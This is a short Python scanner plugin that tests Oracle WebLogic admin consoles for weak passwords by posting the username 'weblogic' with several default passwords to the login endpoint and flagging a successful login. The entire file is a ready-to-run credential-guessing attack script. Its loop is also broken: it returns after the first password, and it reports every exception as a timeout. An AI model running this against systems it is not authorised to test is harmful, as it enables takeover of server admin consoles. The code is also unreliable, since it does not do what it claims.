#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic 弱口令漏洞
referer: unknown
author: Lucifer
description: weblogic 后台弱口令
'''

import json
import requests


class weblogic_weak_pass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/x-www-form-urlencoded"
        }
        payload = "/console/j_security_check"
        passwd = ["weblogic", "weblogic1", "weblogic12", "weblogic123"]
        vulnurl = self.url + payload
        for pwd in passwd:
            post_data = {
                "j_username":"weblogic",
                "j_password":pwd
            }
            try:
                req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False, allow_redirects=False)
                if req.status_code == 302 and r"console" in req.text and r"LoginForm.jsp" not in req.text:
                    return "[+]存在weblogic 弱口令漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                else:
                    return "no vuln"

            except:
                return "[-] ====>连接超时"
